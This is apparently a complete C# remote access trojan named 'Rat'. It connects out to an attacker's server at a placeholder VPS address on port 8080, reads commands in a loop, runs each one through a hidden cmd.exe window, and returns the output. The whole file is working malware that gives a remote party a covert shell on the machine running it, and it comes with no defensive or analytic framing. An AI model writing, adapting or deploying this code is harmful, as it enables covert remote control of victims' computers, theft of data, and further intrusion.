using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Text;
using System.Threading;

class Rat
{
    static void Main()
    {
        string vpsIp = "your_vps_ip";
        int vpsPort = 8080;

        TcpClient client = new TcpClient(vpsIp, vpsPort);
        NetworkStream stream = client.GetStream();

        byte[] buffer = new byte[1024];
        int bytesRead;

        while (true)
        {
            bytesRead = 0;
            while (bytesRead < 1024)
            {
                int read = stream.Read(buffer, bytesRead, 1024 - bytesRead);
                if (read == 0)
                {
                    break;
                }
                bytesRead += read;
            }

            string command = Encoding.ASCII.GetString(buffer, 0, bytesRead);
            command = command.Trim('\0');

            string result = ExecuteCommand(command);

            byte[] resultBytes = Encoding.ASCII.GetBytes(result);
            stream.Write(resultBytes, 0, resultBytes.Length);
        }
    }

    static string ExecuteCommand(string command)
    {
        try
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c " + command;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();

            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            return output;
        }
        catch (Exception ex)
        {
            return "Error: " + ex.Message;
        }
    }
}
